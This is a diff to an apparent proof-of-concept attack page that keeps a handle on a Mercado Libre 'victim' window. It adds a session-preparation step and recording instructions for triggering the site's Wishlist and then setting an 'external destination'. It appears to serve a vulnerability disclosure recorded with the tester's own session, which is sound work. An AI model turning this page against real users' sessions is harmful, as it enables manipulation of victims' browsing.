@@ -124,6 +124,8 @@
       </header>
 
       <section class="panel">
+        <div class="status error" style="margin-top: 0; margin-bottom: 16px;">If Mercado Libre opens <code>/gz/account-verification</code> or a login page, complete that step first, return here, and then use step 1 again. The Wishlist listeners do not exist on the verification page.</div>
+
         <div class="field">
           <label for="target">Mercado Libre product page</label>
           <input id="target" value="https://www.mercadolibre.com.ar/el-portugues-nueces-mariposas-extra-light-x-1kg/p/MLA25811881/">
@@ -135,8 +137,13 @@
         </div>
 
         <div class="actions">
+          <button id="prepare">
+            <strong>Prepare mobile Mercado Libre session</strong>
+            <span>Optional: complete login or account verification in the victim window before recording.</span>
+          </button>
+
           <button id="open">
-            <strong>1. Open Mercado Libre</strong>
+            <strong>1. Load/reload the vulnerable product</strong>
             <span>Wait until the mobile product page has fully loaded.</span>
           </button>
 
@@ -163,7 +170,8 @@
         <h2>Recording sequence</h2>
         <ol>
           <li>Use a mobile User-Agent and your own logged-in test session.</li>
-          <li>Use step 1 to open the product and wait until it has fully loaded.</li>
+          <li>Before recording, use <strong>Prepare mobile Mercado Libre session</strong> and complete any login/account-verification screen.</li>
+          <li>Return here and use step 1 to load the product into the same retained victim window.</li>
           <li>Return here and click step 2 once. Stay on the victim window until Wishlist appears.</li>
           <li>Return here and use step 3 to set the external destination.</li>
           <li>Close Wishlist with its X button.</li>
@@ -191,6 +199,24 @@
       const focusButton = document.querySelector('#focus');
 
       document.querySelector('#origin').textContent = 'Attacker origin: ' + location.origin;
+
+      document.querySelector('#prepare').addEventListener('click', () => {
+        stopWishlistTrigger();
+        victim = window.open('https://www.mercadolibre.com.ar/', 'core021-victim');
+
+        if (!victim) {
+          setStatus('Popup blocked. Allow popups for this site and retry.', 'error');
+          return;
+        }
+
+        log.textContent = [
+          '[preparation] Mobile Mercado Libre session opened',
+          'Complete login or /gz/account-verification in the victim window.',
+          'Then return here and click step 1.'
+        ].join('\n');
+        setStatus('Complete login/account verification in the victim window, then return for step 1.', 'success');
+        victim.focus();
+      });
 
       function setStatus(message, type = '') {
         status.textContent = message;
@@ -249,7 +275,7 @@
           'target: ' + target,
           'WindowProxy retained: true'
         ].join('\n');
-        setStatus('Victim opened. Wait until the product is fully loaded, then return for step 2.', 'success');
+        setStatus('Product requested in the retained victim window. Confirm the address bar stays on the /p/ product URL, then return for step 2.', 'success');
         victim.focus();
       });
 
